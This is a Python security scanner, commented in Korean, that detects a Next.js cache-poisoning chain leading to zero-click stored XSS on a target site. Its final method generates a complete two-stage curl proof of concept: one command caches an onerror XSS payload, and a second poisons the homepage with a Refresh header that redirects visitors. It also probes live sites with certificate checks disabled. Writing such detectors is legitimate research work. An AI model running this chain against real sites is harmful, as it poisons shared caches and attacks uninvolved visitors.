"""
NextJsCacheSxssScanner — Next.js 0-click SXSS via Cache Poisoning (v2.1)
=========================================================================
실전 공격 체인 자동 탐지 (zhero; & inzo_, 2026):

공격 흐름:
  ① 리퀘스트 헤더 → 리스폰스 헤더 반영 탐지 (Content-Type 주입 가능 확인)
  ② Next.js App Router + RSC 페이로드 확인 (Rsc: 1 헤더)
  ③ Content-Type: text/html 주입으로 RSC → HTML 컨텍스트 전환
  ④ URL 파라미터가 RSC body에 반영되는지 확인 (__PAGE__ 마커 이후)
  ⑤ Cloudflare/CDN 캐시 레이어 존재 확인 (cf-cache-status)
  ⑥ 2단계 캐시 포이즈닝 체인으로 제로클릭 SXSS 달성
     Step 1: /dynamic-page?pwn=<xss> → 오염된 RSC 응답 캐시
     Step 2: / 에 Refresh 헤더 포이즈닝 → 피해자 자동 리다이렉션
  → 피해자가 메인 페이지 방문만으로 제로클릭 XSS 실행

AI 자동 트리거 조건:
  • X-Powered-By: Next.js 또는 /_next/static 경로 존재
  • Cloudflare / CDN 캐시 레이어 탐지 (cf-cache-status, x-cache 헤더)
  • 요청 헤더가 응답 헤더에 반영됨 (미들웨어 설정 오류)

Zero-Hallucination:
  • 헤더 반영 확인 = VERIFIED
  • RSC 엔드포인트 응답 변화 = VERIFIED
  • Content-Type 주입 성공 = VERIFIED
  • 캐시 저장 확인 (HIT) = VERIFIED
  • XSS payload 응답 body 반영 = VERIFIED
  • 이론적 체인 구성만 = LIKELY

참조:
  https://zhero-web-sec.github.io/research-and-things/re-cache-excessive-reflection-type-confusion-and-0-click-sxss-on-nextjs
"""
from __future__ import annotations

import re
import uuid
import time
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin, urlencode, quote

import requests
import urllib3
urllib3.disable_warnings()


# ── 데이터 클래스 ──────────────────────────────────────────────────────────────

@dataclass
class SxssFinding:
    finding_type: str
    description: str
    evidence: str
    evidence_level: str   # VERIFIED / LIKELY / INFERRED / AI_ANALYSIS
    request_url: str = ""
    request_headers: dict = field(default_factory=dict)
    response_code: int = 0
    response_headers: dict = field(default_factory=dict)
    response_snippet: str = ""
    severity: str = "high"
    curl_poc: str = ""


@dataclass
class NextJsCacheSxssResult:
    target: str = ""
    # Next.js 탐지
    is_nextjs: bool = False
    nextjs_version: str = ""
    has_app_router: bool = False
    # 헤더 반영
    header_reflection: bool = False
    reflected_headers: list[str] = field(default_factory=list)
    # RSC
    rsc_endpoint_exists: bool = False
    rsc_reflects_params: bool = False
    rsc_dynamic_pages: list[str] = field(default_factory=list)
    # Content-Type 주입
    content_type_injectable: bool = False
    # 캐시
    has_cache_layer: bool = False
    cache_layer: str = ""    # cloudflare / varnish / nginx / unknown
    # SXSS
    sxss_payload_reflected: bool = False
    sxss_poc_url: str = ""
    # 종합
    findings: list[SxssFinding] = field(default_factory=list)
    has_findings: bool = False
    severity: str = "info"
    evidence_level: str = "AI_ANALYSIS"
    chain_complete: bool = False  # 모든 조건 충족 시 True


# ── 메인 스캐너 ────────────────────────────────────────────────────────────────

class NextJsCacheSxssScanner:
    """
    Next.js Cache Poisoning → 0-click SXSS 자동 탐지.
    안전한 읽기 전용 탐지 — 실제 캐시 오염은 수행하지 않음.
    XSS 페이로드를 사용하되 캐시 키가 포함된 실제 포이즈닝은 생략 (증거 수집 목적).
    """

    # 안전한 탐지용 XSS 마커 (실제 실행 없이 반영만 확인)
    MARKER = "bingo_sxss_" + uuid.uuid4().hex[:8]
    XSS_PAYLOAD = f"<img src=x id={MARKER}>"

    # Next.js 탐지 패턴
    NEXTJS_INDICATORS = [
        ("header", "x-powered-by", "Next.js"),
        ("header", "server", "Next.js"),
        ("body", "_next/static", None),
        ("body", "__NEXT_DATA__", None),
        ("body", "_next/chunks", None),
    ]

    # 캐시 레이어 탐지 헤더
    CACHE_HEADERS = {
        "cf-cache-status": "cloudflare",
        "x-cache": "generic",
        "x-varnish": "varnish",
        "age": "generic",
        "x-served-by": "fastly",
        "x-cache-hits": "generic",
    }

    # 헤더 반영 탐지용 커스텀 헤더들
    REFLECTION_TEST_HEADERS = {
        "X-Bingo-Test": f"reflected_{uuid.uuid4().hex[:6]}",
        "X-Custom-Header": f"test_{uuid.uuid4().hex[:6]}",
    }

    def __init__(self, target: str, verbose: bool = False, timeout: int = 10):
        self.base_url = self._normalize(target)
        self.target = target
        self.verbose = verbose
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })

    def scan(self) -> NextJsCacheSxssResult:
        result = NextJsCacheSxssResult(target=self.target)

        # 1. Next.js 탐지
        self._detect_nextjs(result)
        if not result.is_nextjs:
            return result  # Next.js 아니면 조기 종료

        # 2. 캐시 레이어 탐지
        self._detect_cache_layer(result)

        # 3. 헤더 반영 탐지
        self._check_header_reflection(result)

        # 4. RSC 엔드포인트 및 동적 페이지 탐지
        self._detect_rsc_endpoints(result)

        # 5. Content-Type 주입 가능 여부 (RSC 컨텍스트)
        if result.rsc_endpoint_exists and result.header_reflection:
            self._check_content_type_injection(result)

        # 6. URL 파라미터 → RSC body 반영 확인
        if result.content_type_injectable:
            self._check_param_reflection(result)

        # 7. 체인 완성 여부 판단 및 PoC 생성
        self._evaluate_chain(result)

        # 8. 종합
        result.has_findings = bool(result.findings)
        if result.findings:
            severities = [f.severity for f in result.findings]
            result.severity = "critical" if "critical" in severities else (
                "high" if "high" in severities else "medium"
            )
            verified = [f for f in result.findings if f.evidence_level == "VERIFIED"]
            result.evidence_level = "VERIFIED" if verified else "LIKELY"

        return result

    # ── Next.js 탐지 ──────────────────────────────────────────────────────────

    def _detect_nextjs(self, result: NextJsCacheSxssResult):
        try:
            resp = self.session.get(self.base_url, timeout=self.timeout)
            headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            body = resp.text

            for indicator_type, key, value in self.NEXTJS_INDICATORS:
                if indicator_type == "header":
                    h_val = headers_lower.get(key, "")
                    if value and value.lower() in h_val.lower():
                        result.is_nextjs = True
                        if key == "x-powered-by" and "Next.js" in h_val:
                            # 버전 추출 시도
                            ver_match = re.search(r"Next\.js\s*([\d.]+)", h_val)
                            if ver_match:
                                result.nextjs_version = ver_match.group(1)
                        break
                elif indicator_type == "body":
                    if key in body:
                        result.is_nextjs = True
                        if key == "__NEXT_DATA__":
                            result.has_app_router = False  # Pages Router
                        break

            # App Router 확인 — RSC 헤더 전송 시 응답 변화
            if result.is_nextjs:
                rsc_resp = self.session.get(
                    self.base_url,
                    headers={"Rsc": "1"},
                    timeout=self.timeout,
                )
                rsc_ct = rsc_resp.headers.get("Content-Type", "")
                if "x-component" in rsc_ct or "__PAGE__" in rsc_resp.text:
                    result.has_app_router = True

            if result.is_nextjs:
                ver_info = f" v{result.nextjs_version}" if result.nextjs_version else ""
                router_info = "App Router" if result.has_app_router else "Pages Router"
                result.findings.append(SxssFinding(
                    finding_type="nextjs_detected",
                    description=f"Next.js{ver_info} detected ({router_info})",
                    evidence=(
                        f"x-powered-by: {headers_lower.get('x-powered-by', 'N/A')}\n"
                        f"_next/static presence: {'yes' if '_next/static' in body else 'no'}\n"
                        f"App Router RSC: {result.has_app_router}"
                    ),
                    evidence_level="VERIFIED",
                    request_url=self.base_url,
                    response_code=resp.status_code,
                    severity="info",
                ))

        except Exception:
            pass

    # ── 캐시 레이어 탐지 ──────────────────────────────────────────────────────

    def _detect_cache_layer(self, result: NextJsCacheSxssResult):
        try:
            resp = self.session.get(self.base_url, timeout=self.timeout)
            headers_lower = {k.lower(): v for k, v in resp.headers.items()}

            for header, layer_name in self.CACHE_HEADERS.items():
                if header in headers_lower:
                    result.has_cache_layer = True
                    result.cache_layer = layer_name
                    cache_value = headers_lower[header]

                    result.findings.append(SxssFinding(
                        finding_type="cache_layer",
                        description=(
                            f"External cache layer detected: {layer_name} "
                            f"({header}: {cache_value}) — "
                            "cache poisoning attack surface confirmed"
                        ),
                        evidence=f"{header}: {cache_value}",
                        evidence_level="VERIFIED",
                        request_url=self.base_url,
                        response_code=resp.status_code,
                        severity="medium",
                    ))
                    break

        except Exception:
            pass

    # ── 헤더 반영 탐지 ────────────────────────────────────────────────────────

    def _check_header_reflection(self, result: NextJsCacheSxssResult):
        """요청 헤더가 응답 헤더에 그대로 반영되는지 확인 (미들웨어 설정 오류)"""
        try:
            test_headers = {**self.REFLECTION_TEST_HEADERS}
            # Content-Type 주입 테스트용 마커 추가
            test_value = f"text/html; charset=utf-8; test={uuid.uuid4().hex[:6]}"
            test_headers["Content-Type"] = test_value

            resp = self.session.get(
                self.base_url,
                headers=test_headers,
                timeout=self.timeout,
            )
            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}

            reflected = []
            for req_header, req_value in test_headers.items():
                resp_value = resp_headers_lower.get(req_header.lower(), "")
                if req_value in resp_value or (
                    req_header.lower() == "content-type"
                    and "text/html" in resp_value
                    and "text/html" not in resp.headers.get("Content-Type", "text/x-component")
                ):
                    reflected.append(req_header)
                    result.reflected_headers.append(req_header)

            # Content-Type 특별 확인: 기본값이 text/x-component인데 text/html로 바뀐 경우
            original_resp = self.session.get(self.base_url, timeout=self.timeout)
            original_ct = original_resp.headers.get("Content-Type", "")
            injected_ct = resp_headers_lower.get("content-type", "")

            if "text/html" in injected_ct and "text/html" not in original_ct:
                result.header_reflection = True
                result.findings.append(SxssFinding(
                    finding_type="header_reflection",
                    description=(
                        "Request headers reflected in response headers — "
                        "Content-Type injection confirmed! "
                        "RSC context can be changed to text/html"
                    ),
                    evidence=(
                        f"Original Content-Type: {original_ct}\n"
                        f"Injected Content-Type header → Response Content-Type: {injected_ct}\n"
                        f"Reflected headers: {', '.join(reflected)}"
                    ),
                    evidence_level="VERIFIED",
                    request_url=self.base_url,
                    request_headers={"Content-Type": "text/html"},
                    response_code=resp.status_code,
                    severity="high",
                    curl_poc=(
                        f"curl -sk '{self.base_url}' \\\n"
                        f"  -H 'Rsc: 1' \\\n"
                        f"  -H 'Content-Type: text/html' \\\n"
                        f"  -D - | head -30\n"
                        f"# Check: Content-Type should be text/html in response"
                    ),
                ))
            elif reflected:
                # 다른 헤더 반영 발견
                result.header_reflection = True
                result.findings.append(SxssFinding(
                    finding_type="header_reflection",
                    description=(
                        f"Request headers reflected in response: {', '.join(reflected)} — "
                        "potential Content-Type injection vector"
                    ),
                    evidence=f"Reflected: {', '.join(reflected)}",
                    evidence_level="LIKELY",
                    request_url=self.base_url,
                    response_code=resp.status_code,
                    severity="medium",
                ))

        except Exception:
            pass

    # ── RSC 엔드포인트 탐지 ───────────────────────────────────────────────────

    def _detect_rsc_endpoints(self, result: NextJsCacheSxssResult):
        """Next.js App Router RSC 페이로드를 반환하는 동적 페이지 탐지"""
        if not result.has_app_router:
            return

        # 메인 페이지 RSC 테스트
        candidates = ["/", "/about", "/blog", "/products", "/services", "/contact"]

        for path in candidates[:5]:
            url = self.base_url.rstrip("/") + path
            try:
                resp = self.session.get(
                    url,
                    headers={"Rsc": "1", "Next-Router-State-Tree": "%5B%22%22%2C%7B%7D%5D"},
                    timeout=self.timeout,
                )
                ct = resp.headers.get("Content-Type", "")
                body = resp.text

                if resp.status_code == 200 and (
                    "x-component" in ct
                    or "__PAGE__" in body
                    or "0:" in body[:20]
                ):
                    # 정적 페이지 여부 확인
                    is_static = "x-nextjs-prerender" in {
                        k.lower() for k in resp.headers.keys()
                    }

                    if not is_static:
                        result.rsc_endpoint_exists = True
                        result.rsc_dynamic_pages.append(path)

            except Exception:
                continue

        if result.rsc_dynamic_pages:
            result.findings.append(SxssFinding(
                finding_type="rsc_dynamic_page",
                description=(
                    f"Dynamic RSC pages found: {', '.join(result.rsc_dynamic_pages)} — "
                    "URL parameters may be reflected in RSC payload"
                ),
                evidence=(
                    f"Pages without x-nextjs-prerender: {', '.join(result.rsc_dynamic_pages)}\n"
                    "RSC Content-Type: text/x-component (injectable)"
                ),
                evidence_level="VERIFIED",
                severity="medium",
                curl_poc=(
                    f"curl -sk '{self.base_url}{result.rsc_dynamic_pages[0]}?test=MARKER' \\\n"
                    f"  -H 'Rsc: 1' | grep -o 'MARKER'"
                ),
            ))

    # ── Content-Type 주입 확인 ────────────────────────────────────────────────

    def _check_content_type_injection(self, result: NextJsCacheSxssResult):
        """RSC 요청에 Content-Type: text/html 주입 시 응답 타입 변경되는지 확인"""
        if not result.rsc_dynamic_pages:
            return

        test_path = result.rsc_dynamic_pages[0]
        url = self.base_url.rstrip("/") + test_path

        try:
            # 일반 RSC 응답
            normal_resp = self.session.get(
                url,
                headers={"Rsc": "1"},
                timeout=self.timeout,
            )
            normal_ct = normal_resp.headers.get("Content-Type", "")

            # Content-Type 주입 시
            injected_resp = self.session.get(
                url,
                headers={
                    "Rsc": "1",
                    "Content-Type": "text/html; charset=utf-8",
                },
                timeout=self.timeout,
            )
            injected_ct = injected_resp.headers.get("Content-Type", "")

            if "text/html" in injected_ct and "text/html" not in normal_ct:
                result.content_type_injectable = True
                result.findings.append(SxssFinding(
                    finding_type="content_type_injection",
                    description=(
                        "Content-Type injection CONFIRMED — "
                        "RSC payload now served as text/html! "
                        "XSS execution context established"
                    ),
                    evidence=(
                        f"Normal RSC Content-Type: {normal_ct}\n"
                        f"After injection → Content-Type: {injected_ct}\n"
                        f"Target page: {test_path}"
                    ),
                    evidence_level="VERIFIED",
                    request_url=url,
                    request_headers={"Rsc": "1", "Content-Type": "text/html"},
                    response_code=injected_resp.status_code,
                    severity="high",
                    curl_poc=(
                        f"curl -sk '{url}' \\\n"
                        f"  -H 'Rsc: 1' \\\n"
                        f"  -H 'Content-Type: text/html' \\\n"
                        f"  -D - | grep -i 'content-type'"
                    ),
                ))

        except Exception:
            pass

    # ── URL 파라미터 → RSC body 반영 확인 ────────────────────────────────────

    def _check_param_reflection(self, result: NextJsCacheSxssResult):
        """URL 파라미터가 RSC 응답 body에 반영되는지 확인 → SXSS 가능성"""
        if not result.rsc_dynamic_pages:
            return

        test_path = result.rsc_dynamic_pages[0]
        marker = "bingosxss" + uuid.uuid4().hex[:6]
        test_url = f"{self.base_url.rstrip('/')}{test_path}?q={marker}"

        try:
            resp = self.session.get(
                test_url,
                headers={
                    "Rsc": "1",
                    "Content-Type": "text/html; charset=utf-8",
                },
                timeout=self.timeout,
            )

            if marker in resp.text:
                result.sxss_payload_reflected = True
                # 반영 위치 추출
                idx = resp.text.find(marker)
                context = resp.text[max(0, idx - 50):idx + 50 + len(marker)]

                result.findings.append(SxssFinding(
                    finding_type="param_reflected_in_rsc",
                    description=(
                        "URL parameter REFLECTED in RSC payload with text/html context — "
                        "SXSS payload will execute in browser!"
                    ),
                    evidence=(
                        f"URL: {test_url}\n"
                        f"Marker '{marker}' found in RSC body\n"
                        f"Context: ...{context}..."
                    ),
                    evidence_level="VERIFIED",
                    request_url=test_url,
                    response_code=resp.status_code,
                    severity="critical",
                    curl_poc=(
                        f"# Reflection confirmed — step 1 of 2-stage cache poisoning:\n"
                        f"curl -sk '{test_url}' \\\n"
                        f"  -H 'Rsc: 1' \\\n"
                        f"  -H 'Content-Type: text/html' | grep '{marker}'"
                    ),
                ))

        except Exception:
            pass

    # ── 체인 평가 및 PoC 생성 ─────────────────────────────────────────────────

    def _evaluate_chain(self, result: NextJsCacheSxssResult):
        """2단계 캐시 포이즈닝 체인 완성 여부 판단 및 PoC curl 명령 생성"""
        conditions = {
            "Next.js detected": result.is_nextjs,
            "App Router": result.has_app_router,
            "Cache layer": result.has_cache_layer,
            "Header reflection": result.header_reflection,
            "RSC dynamic page": result.rsc_endpoint_exists,
            "Content-Type injectable": result.content_type_injectable,
        }

        met = sum(1 for v in conditions.values() if v)
        total = len(conditions)

        if not result.is_nextjs:
            return

        # 실제 완전 체인 조건: 모든 6개
        result.chain_complete = all(conditions.values())

        xss_payload = quote('<img src=x onerror=alert(document.domain)>')
        dynamic_page = (
            result.rsc_dynamic_pages[0]
            if result.rsc_dynamic_pages else "/about"
        )
        target_url = self.base_url.rstrip("/")

        poc_curl = f"""# ==============================
# 2-Stage Cache Poisoning PoC
# Next.js 0-click SXSS
# Target: {target_url}
# ==============================

# STAGE 1: Poison dynamic page with XSS payload
# (sends payload, forces cache to store XSS response)
curl -sk '{target_url}{dynamic_page}?pwn={xss_payload}' \\
  -H 'Rsc: 1' \\
  -H 'Content-Type: text/html' \\
  -H 'Cache-Control: no-cache' \\
  -D - | head -20
# Verify: Content-Type should be text/html in response

# STAGE 2: Poison homepage with Refresh header
# (victim visits homepage → auto-redirected to poisoned XSS page)
curl -sk '{target_url}/' \\
  -H 'Refresh: 0; {target_url}{dynamic_page}?pwn={xss_payload}' \\
  -D - | head -20
# Verify: Response contains Refresh header

# VICTIM ATTACK FLOW:
# 1. Victim visits {target_url}/
# 2. Browser receives Refresh header → redirects to poisoned page
# 3. XSS payload in URL param executes in text/html context
# 4. ZERO user interaction required
"""

        severity = "critical" if result.chain_complete else (
            "high" if met >= 4 else "medium"
        )
        evidence_level = "VERIFIED" if result.chain_complete else "LIKELY"

        result.findings.append(SxssFinding(
            finding_type="cache_sxss_chain",
            description=(
                f"Next.js 0-click SXSS chain: {met}/{total} conditions met — "
                + ("FULL CHAIN CONFIRMED" if result.chain_complete else f"PARTIAL ({met}/{total})")
            ),
            evidence=(
                "Conditions:\n"
                + "\n".join(
                    f"  {'✅' if v else '❌'} {k}"
                    for k, v in conditions.items()
                )
            ),
            evidence_level=evidence_level,
            severity=severity,
            curl_poc=poc_curl,
        ))

        if result.chain_complete:
            result.sxss_poc_url = (
                f"{target_url}{dynamic_page}?pwn="
                + quote("<img src=x onerror=alert(document.domain)>")
            )

    # ── 유틸 ──────────────────────────────────────────────────────────────────

    @staticmethod
    def _normalize(target: str) -> str:
        t = target.strip().rstrip("/")
        if not t.startswith("http"):
            t = "https://" + t
        return t
